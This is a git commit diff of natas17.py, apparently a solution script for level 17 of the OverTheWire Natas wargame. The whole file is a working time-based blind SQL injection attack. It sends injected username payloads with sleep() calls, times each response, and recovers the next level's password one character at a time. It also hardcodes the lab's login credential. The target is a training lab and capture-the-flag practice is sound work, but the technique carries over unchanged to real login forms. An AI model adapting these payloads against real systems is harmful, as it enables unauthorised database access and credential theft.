4eccfd2bc60841f17844c698434d05d9780b09a6
HwangJimmy <112998284+HwangJimmy@users.noreply.github.com>
2022-10-09 09:16:40 +0800

    Update natas17.py

--- natas/natas17.py
+++ natas/natas17.py
@@ -1,37 +1,53 @@
-#!/usr/bin/env
+#!/usr/bin/env python3
+
 import requests
-url = 'http://natas17.natas.labs.overthewire.org'
-content = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+from requests.auth import HTTPBasicAuth
+
+
+sleep_time = 1
 s = requests.Session()
-s.auth = ('natas17', 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd')
+s.auth = HTTPBasicAuth("natas17", "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd")
+url = 'http://natas17.natas.labs.overthewire.org/?debug'
 
-def is_in(data):
-    req = s.post(url, data = data)
-    return req.elapsed.seconds >= 5
 
-def character():
-    char_selected = ''
-    for var in content:
-        data = {'username': f'natas18" and password like binary "%{var}%" and sleep(5) # '}
-        if is_in(data):
-            char_selected += var
-        print(char_selected)
-    return char_selected
+def get_password_chars():
+    filtered_chars = ''
+    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
 
-def char_sequence(char_selected):
-    seq = ''
+    print('Looking for password char set...')
+    for char in chars:
+        data = {'username': f'natas18" and password like binary "%{char}%" and sleep({sleep_time}) #'}
+        resp = s.post(url, data=data)
+        # print(f'response time: {resp.elapsed.seconds}')
+
+        if resp.elapsed.seconds >= sleep_time:
+            filtered_chars += char
+            print(f'The password contains: {filtered_chars}')
+
+    return filtered_chars
+
+
+def get_password(filtered_chars):
+    password = ''
     for i in range(32):
-        for var in char_selected:
-            data = {'username': f'natas18" and password like binary "{seq}{var}%" and sleep(5) # '}
-            if is_in(data):
-                seq += var
-            print(seq)
-    return seq
+        print(f'Looking for position {i}...')
 
-char_selected = character()
-print("\n\n\nFind correct sequence!!!")
-print(char_sequence(char_selected))
+        for char in filtered_chars:
+            data = {'username': f'natas18" and password rlike binary "^{password}{char}" and sleep({sleep_time}) #'}
+            resp = s.post(url, data=data)
+
+            # print(f'response time: {resp.elapsed.seconds}')
+            if resp.elapsed.seconds >= sleep_time:
+                password += char
+                print(password)
+                break
+
+    return password
 
 
+# Step 1: Find out what chars the password contains
+filtered_chars = get_password_chars()
 
-
+# Step 2: Find out the password by ordering the chars found in step 1
+password = get_password(filtered_chars)
+print(f'The password: {password}')
